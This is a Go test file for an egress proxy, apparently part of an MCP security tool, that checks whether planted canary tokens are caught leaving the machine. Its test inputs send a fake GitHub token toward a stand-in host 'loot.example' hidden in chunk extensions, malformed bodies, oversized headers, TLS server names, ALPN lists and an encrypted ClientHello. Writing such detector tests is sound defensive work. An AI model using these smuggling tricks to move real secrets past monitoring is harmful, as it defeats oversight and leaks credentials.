package egress

import (
	"crypto/tls"
	"io"
	"math/big"
	"net"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
	"github.com/JairJosafath/mcp-customs/src/internal/findings"
)

// serveProxy serves e's proxy, DNS and catcher on loopback until the test ends,
// and answers the proxy's address.
func serveProxy(t *testing.T, e *Egress) string {
	t.Helper()
	l, err := Listen(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(e.Serve(l, RedirectedFrom))
	return l.Proxy.Addr().String()
}

// sendRaw writes raw to the proxy at addr, stops writing, and reads the
// answer until the proxy closes the connection.
func sendRaw(t *testing.T, addr, raw string) {
	t.Helper()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := io.WriteString(conn, raw); err != nil {
		t.Fatal(err)
	}
	if tcp, ok := conn.(*net.TCPConn); ok {
		_ = tcp.CloseWrite()
	}
	_, _ = io.Copy(io.Discard, conn)
}

func TestWhatTheProxyCantReadAsARequestIsStillSearched(t *testing.T) {
	token := testCanaries.Get(canary.GitHubToken)
	post := "POST http://loot.example/x HTTP/1.1\r\nHost: loot.example\r\n"
	for name, tc := range map[string]struct {
		raw       string
		unscanned bool
		// host, when set, is the host the observation holding the canary
		// names: the request was read, its body not whole.
		host string
	}{
		"a chunk extension":              {post + "Transfer-Encoding: chunked\r\n\r\n2;k=" + token + "\r\nhi\r\n0\r\n\r\n", false, ""},
		"a body shorter than its length": {post + "Content-Length: 1000\r\n\r\nk=" + token, true, "loot.example"},
		"a malformed chunk":              {post + "Transfer-Encoding: chunked\r\n\r\n" + "22\r\nk=" + token + "\r\nZZ\r\n", true, "loot.example"},
		"a header over 1 MB":             {"GET http://loot.example/ HTTP/1.1\r\nHost: loot.example\r\nX-K: " + token + strings.Repeat("x", 1100<<10) + "\r\n\r\n", true, ""},
		"an invalid header name":         {"GET http://loot.example/ HTTP/1.1\r\nHost: loot.example\r\nX K: " + token + "\r\n\r\n", true, ""},
		"a bad content length":           {post + "Content-Length: nope\r\n\r\nk=" + token, true, ""},
		"an HTTP/2 preface":              {"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\nk=" + token, false, ""},
		"bytes that aren't HTTP":         {"k=" + token + "\r\n\r\n", true, ""},
		"the token after a request":      {"GET http://loot.example/ HTTP/1.1\r\nHost: loot.example\r\n\r\nk=" + token + "\r\n\r\n", false, ""},
		"a request to the proxy itself":  {"GET / HTTP/1.1\r\nHost: proxy\r\nX-K: " + token + "\r\n\r\n", false, ""},
	} {
		t.Run(name, func(t *testing.T) {
			rec := newRecorded()
			e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}})
			e.Observe(rec.observe)
			e.SetCanaries(testCanaries)
			sendRaw(t, serveProxy(t, e), tc.raw)
			rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
			if got := hasRule(leftAs(t, rec), findings.RuleBodyUnscanned); got != tc.unscanned {
				t.Errorf("findings = %+v, want %s: %v", leftAs(t, rec), findings.RuleBodyUnscanned, tc.unscanned)
			}
			if tc.host != "" && !slices.ContainsFunc(rec.of(KindHTTP), func(o any) bool {
				d, _ := o.(HTTPDetail)
				return d.Host == tc.host && len(d.Canaries) > 0
			}) {
				t.Errorf("http observations = %+v, want one of %s with the canary", rec.of(KindHTTP), tc.host)
			}
		})
	}
}

func TestATunnelsServerNameIsRecordedAndSearched(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	conn, err := net.Dial("tcp", serveProxy(t, e))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := io.WriteString(conn, "CONNECT loot.example:443 HTTP/1.1\r\nHost: loot.example:443\r\n\r\n"); err != nil {
		t.Fatal(err)
	}
	ok := make([]byte, len("HTTP/1.1 200 Connection established\r\n\r\n"))
	if _, err := io.ReadFull(conn, ok); err != nil {
		t.Fatal(err)
	}
	sni := strings.ToLower(testCanaries.Get(canary.GitHubToken)) + ".loot.example"
	client := tls.Client(conn, &tls.Config{ServerName: sni, RootCAs: ca.Pool(), MinVersion: tls.VersionTLS12})
	if err := client.HandshakeContext(t.Context()); err != nil {
		t.Fatal(err)
	}
	_ = client.Close()
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
	d, _ := rec.of(KindConnect)[0].(ConnectDetail)
	if d.ServerName != sni || d.Host != "loot.example" {
		t.Errorf("connect = %+v, want the server name %s recorded", d, sni)
	}
	if !hasRule(leftAs(t, rec), findings.RuleCanaryLeft) {
		t.Errorf("findings = %+v, want the token in the server name found", leftAs(t, rec))
	}
}

// openTunnel sends CONNECT host:443 to the proxy at addr and answers the
// connection once the proxy agrees.
func openTunnel(t *testing.T, addr, host string) net.Conn {
	t.Helper()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = conn.Close() })
	if _, err := io.WriteString(conn, "CONNECT "+host+":443 HTTP/1.1\r\nHost: "+host+":443\r\n\r\n"); err != nil {
		t.Fatal(err)
	}
	ok := make([]byte, len("HTTP/1.1 200 Connection established\r\n\r\n"))
	if _, err := io.ReadFull(conn, ok); err != nil {
		t.Fatal(err)
	}
	return conn
}

func TestTheWholeClientHelloIsSearched(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	conn := openTunnel(t, serveProxy(t, e), "loot.example")
	client := tls.Client(conn, &tls.Config{
		ServerName: "loot.example", RootCAs: ca.Pool(), MinVersion: tls.VersionTLS12,
		NextProtos: []string{"k=" + testCanaries.Get(canary.GitHubToken), "http/1.1"},
	})
	if err := client.HandshakeContext(t.Context()); err != nil {
		t.Fatal(err)
	}
	_ = client.Close()
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
	if !hasRule(leftAs(t, rec), findings.RuleCanaryLeft) {
		t.Errorf("connect = %+v, want the token in the ALPN list found", rec.of(KindConnect))
	}
}

// clientHello is the first TLS record a Go client sends for cfg.
func clientHello(t *testing.T, cfg *tls.Config) []byte {
	t.Helper()
	c1, c2 := net.Pipe()
	defer func() { _ = c2.Close() }()
	go func() {
		_ = tls.Client(c1, cfg).HandshakeContext(t.Context())
		_ = c1.Close()
	}()
	head := make([]byte, recordHeaderLen)
	if _, err := io.ReadFull(c2, head); err != nil {
		t.Fatal(err)
	}
	body := make([]byte, int(head[3])<<8|int(head[4]))
	if _, err := io.ReadFull(c2, body); err != nil {
		t.Fatal(err)
	}
	return append(head, body...)
}

// withExtension is record, a ClientHello, with one more extension of
// kind at the end, and every length fixed.
func withExtension(t *testing.T, record []byte, kind [2]byte, value []byte) []byte {
	t.Helper()
	msg := record[recordHeaderLen:]
	// Past type, length, version and random: the session ID, the cipher
	// suites and the compression methods.
	at := 4 + 2 + 32
	at += 1 + int(msg[at])
	at += 2 + (int(msg[at])<<8 | int(msg[at+1]))
	at += 1 + int(msg[at])
	ext := slices.Concat(kind[:], bigEndian(len(value), 2), value)
	out := append(slices.Clone(record), ext...)
	m := out[recordHeaderLen:]
	copy(m[at:], bigEndian((int(m[at])<<8|int(m[at+1]))+len(ext), 2))
	copy(m[1:], bigEndian(len(m)-4, 3))
	copy(out[3:], bigEndian(len(m), 2))
	return out
}

// bigEndian is n in size bytes, big-endian.
func bigEndian(n, size int) []byte {
	return big.NewInt(int64(n)).FillBytes(make([]byte, size))
}

func TestAnEncryptedClientHelloIsUnscanned(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	conn := openTunnel(t, serveProxy(t, e), "loot.example")
	hello := clientHello(t, &tls.Config{ServerName: "loot.example", MinVersion: tls.VersionTLS12})
	if _, err := conn.Write(withExtension(t, hello, [2]byte{0xfe, 0x0d}, []byte("sealed"))); err != nil {
		t.Fatal(err)
	}
	_ = conn.Close()
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
	if !hasRule(leftAs(t, rec), findings.RuleBodyUnscanned) {
		t.Errorf("connect = %+v, want %s", rec.of(KindConnect), findings.RuleBodyUnscanned)
	}
}

func TestABodyHeldOpenIsRecordedWhenTheReadTimesOut(t *testing.T) {
	const held = "POST /x HTTP/1.1\r\nHost: loot.example\r\nContent-Length: 1000\r\n\r\nk="
	for name, open := range map[string]func(t *testing.T, addr string, ca *CA) io.Writer{
		"through the proxy": func(t *testing.T, addr string, _ *CA) io.Writer {
			t.Helper()
			conn, err := net.Dial("tcp", addr)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = conn.Close() })
			_, _ = io.WriteString(conn, "POST http://loot.example/x"+strings.TrimPrefix(held, "POST /x"))
			return conn
		},
		"inside a tunnel": func(t *testing.T, addr string, ca *CA) io.Writer {
			t.Helper()
			client := tls.Client(openTunnel(t, addr, "loot.example"), &tls.Config{ServerName: "loot.example", RootCAs: ca.Pool(), MinVersion: tls.VersionTLS12})
			if err := client.HandshakeContext(t.Context()); err != nil {
				t.Fatal(err)
			}
			_, _ = io.WriteString(client, held)
			return client
		},
	} {
		t.Run(name, func(t *testing.T) {
			ca := newCA(t)
			rec := newRecorded()
			e := New(Config{CA: ca, Upstream: &fakeUpstream{}, ReadTimeout: 300 * time.Millisecond})
			e.Observe(rec.observe)
			e.SetCanaries(testCanaries)
			w := open(t, serveProxy(t, e), ca)
			// The token, then nothing more, with the connection held open.
			_, _ = io.WriteString(w, testCanaries.Get(canary.GitHubToken))
			rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
			if !hasRule(leftAs(t, rec), findings.RuleBodyUnscanned) {
				t.Errorf("findings = %+v, want %s too", leftAs(t, rec), findings.RuleBodyUnscanned)
			}
		})
	}
}

func TestARequestToTheProxyItselfTooLargeToSearchIsUnscanned(t *testing.T) {
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	sendRaw(t, serveProxy(t, e), "POST / HTTP/1.1\r\nHost: proxy\r\nContent-Length: 9437184\r\n\r\n"+strings.Repeat("x", 9<<20))
	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleBodyUnscanned) })
}
